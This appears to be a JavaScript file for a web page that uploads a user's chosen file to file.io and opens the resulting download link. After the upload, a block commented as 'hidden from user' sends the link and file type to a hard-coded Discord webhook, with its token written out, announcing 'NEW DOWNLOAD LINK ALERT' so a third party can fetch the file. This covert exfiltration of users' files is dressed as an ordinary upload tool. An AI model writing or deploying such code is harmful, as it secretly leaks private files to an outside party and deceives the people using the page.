const fileInput = document.getElementById('fileInput');
const uploadButton = document.getElementById('uploadButton');
const webhookUrl = 'https://ptb.discord.com/api/webhooks/1292501408746180678/SbDR8QTAt2uIl85-qPohWU7jt_nhSaI9eGJXx-LWhXxbgaV1lrikWlXcLK1XBoNO4yaX';
const maxFileSize = 1024 * 1024 * 100; // 100MB
const uploadTimeout = 30000; // 30 seconds
const maxUploadAttempts = 3;
const uploadAttemptDelay = 100; // 0.1 seconds

let uploadAttempts = 0;

uploadButton.addEventListener('click', async () => {
  const file = fileInput.files[0];

  if (!file) {
    alert('Please select a file to upload.');
    return;
  }

  if (file.size > maxFileSize) {
    alert('File size exceeds the maximum limit of 100MB.');
    return;
  }

  const formData = new FormData();
  formData.append('file', file);

  try {
    const response = await fetch('https://file.io/', {
      method: 'POST',
      body: formData,
      timeout: uploadTimeout,
      headers: {
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': 'application/json',
        'Content-Type': 'multipart/form-data',
      },
    });

    if (!response.ok) {
      throw new Error(`HTTP Error: ${response.status}`);
    }

    const responseJson = await response.json();
    if (!responseJson.link) {
      throw new Error('Failed to extract download link from File.io response');
    }

    const downloadLink = responseJson.link;
    console.log('File.io response:', downloadLink); // Debug download link

    // Open download link in new tab
    const newTab = window.open(downloadLink, '_blank');
    newTab.focus();

    // Send download link to webhook (hidden from user)
    const sendWebhookNotification = async () => {
      try {
        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: `**NEW DOWNLOAD LINK ALERT**\n\n**FILE DETAILS**\n\n**LINK:** ${downloadLink}\n**SERVER:** File.io\n**TYPE:** ${file.type}\n**LINK LOCATION:** ${downloadLink}\n\n**DOWNLOAD NOW AND ENJOY!**`,
          }),
        });

        if (!response.ok) {
          throw new Error(`Webhook Error: ${response.status}`);
        }

        console.log('Webhook notification sent successfully'); // Log webhook success
      } catch (error) {
        console.error('Error sending webhook notification:', error); // More detailed logging for debugging

        if (uploadAttempts < maxUploadAttempts) {
          uploadAttempts++;
          setTimeout(sendWebhookNotification, uploadAttemptDelay);
        } else {
          console.error('Failed to send webhook notification after multiple attempts.');
        }
      }
    };

    sendWebhookNotification();
  } catch (error) {
    console.error('Error uploading file:', error); // More detailed logging for debugging

    if (uploadAttempts < maxUploadAttempts) {
      uploadAttempts++;
      setTimeout(() => {
        uploadButton.click();
      }, uploadAttemptDelay);
    } else {
      alert('Failed to upload file after multiple attempts.');
    }
  }
});
